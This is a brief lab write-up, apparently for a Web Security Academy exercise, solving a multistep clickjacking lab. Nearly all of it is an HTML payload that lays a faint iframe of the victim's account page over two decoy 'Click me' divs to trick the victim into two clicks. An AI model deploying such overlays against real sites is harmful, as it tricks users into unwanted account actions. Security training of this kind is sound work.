On this lab we need a double click. For that reason we use two bottom
```html
<style>
    iframe {
        position:relative;
        width:1000px;
        height: 1000px;
        opacity: 0.1;
        z-index: 2;
    }
    .first, .second {
        position:absolute;
        top:510px;
        left:60px;
        z-index: 1;
    }
   .second { 
       top:310;
       left:210;
    }

</style>
<div class="first">Click me first</div>
<div class="second">Click me next</div>
<iframe src="https://0a7a001d0341bd9580313f8d006e00ed.web-security-academy.net/my-account"></iframe>
```